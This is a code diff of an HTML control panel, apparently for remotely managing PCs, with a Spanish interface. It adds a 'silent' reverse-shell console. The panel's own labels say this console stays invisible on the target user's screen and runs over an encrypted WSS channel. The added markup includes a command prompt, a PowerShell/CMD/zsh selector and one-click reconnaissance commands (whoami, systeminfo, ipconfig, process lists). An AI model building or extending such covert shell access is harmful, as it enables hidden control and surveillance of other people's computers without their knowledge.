@@ -11,7 +11,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="/static/css/styles.css?v=20261111-v10" />
+  <link rel="stylesheet" href="/static/css/styles.css?v=20261111-v11" />
 </head>
 <body>
   <!-- ======================================================================= -->
@@ -720,6 +720,12 @@
             </svg>
             <span>Logs</span>
           </button>
+          <button id="viewer-terminal-btn" type="button" class="btn btn-secondary btn-sm" title="Abrir consola inversa silenciosa (sin ventana en PC)">
+            <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
+            </svg>
+            <span>Consola</span>
+          </button>
         </div>
 
         <div class="shortcut-group" title="Comandos rápidos en PC remota">
@@ -1068,10 +1074,51 @@
       </div>
     </div>
   </section>
+  <!-- Modal de Terminal Inversa Silenciosa (SSH Reverse sobre WSS) -->
+  <div id="terminal-modal" class="modal-backdrop hidden">
+    <div class="modal-card rsh-modal-card">
+      <div class="rsh-header">
+        <div class="rsh-title-wrap">
+          <svg class="icon-md rsh-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
+          </svg>
+          <div>
+            <h2 id="rsh-device-title">Terminal Remota Silenciosa</h2>
+            <p id="rsh-shell-status" class="rsh-sub">Canal cifrado inverso WSS · Invisible en la pantalla del usuario</p>
+          </div>
+        </div>
+        <div class="rsh-toolbar">
+          <select id="rsh-shell-select" class="rsh-select" title="Interprete de comandos">
+            <option value="auto">Auto (zsh / PowerShell)</option>
+            <option value="powershell">PowerShell (Win)</option>
+            <option value="cmd">CMD (Win)</option>
+          </select>
+          <button type="button" id="rsh-ctrlc-btn" class="rsh-btn rsh-btn-warn" title="Enviar Ctrl+C / Interrumpir comando">Ctrl+C</button>
+          <button type="button" id="rsh-clear-btn" class="rsh-btn" title="Limpiar pantalla">Limpiar</button>
+          <button type="button" id="rsh-close-btn" class="rsh-btn rsh-btn-close" title="Cerrar sesion de consola">Cerrar</button>
+        </div>
+      </div>
+
+      <div class="rsh-quick-bar">
+        <button type="button" class="rsh-chip js-rsh-quick" data-cmd-mac="whoami && hostname && sw_vers" data-cmd-win="whoami; hostname; systeminfo | Select-Object -First 6">Identidad / Sistema</button>
+        <button type="button" class="rsh-chip js-rsh-quick" data-cmd-mac="ifconfig | grep 'inet '" data-cmd-win="ipconfig">Red / IP</button>
+        <button type="button" class="rsh-chip js-rsh-quick" data-cmd-mac="df -h" data-cmd-win="Get-PSDrive -PSProvider FileSystem">Discos</button>
+        <button type="button" class="rsh-chip js-rsh-quick" data-cmd-mac="ps aux | head -n 18" data-cmd-win="Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Name,Id,CPU,WorkingSet">Procesos Top</button>
+      </div>
+
+      <pre id="rsh-output" class="rsh-viewport"></pre>
+
+      <form id="rsh-form" class="rsh-input-row">
+        <span class="rsh-prompt">&gt;_</span>
+        <input id="rsh-input" type="text" class="rsh-cmd-input" placeholder="Escribe un comando y presiona Enter (Flechas Arriba/Abajo para historial)..." autocomplete="off" spellcheck="false" />
+        <button type="submit" class="rsh-send-btn">Ejecutar</button>
+      </form>
+    </div>
+  </div>
   </div><!-- /#app-shell -->
 
   <script src="/static/js/audio.js?v=20261111-v9"></script>
   <script src="/static/js/viewer.js?v=20261111-v9"></script>
-  <script src="/static/js/app.js?v=20261111-v10"></script>
+  <script src="/static/js/app.js?v=20261111-v11"></script>
 </body>
 </html>
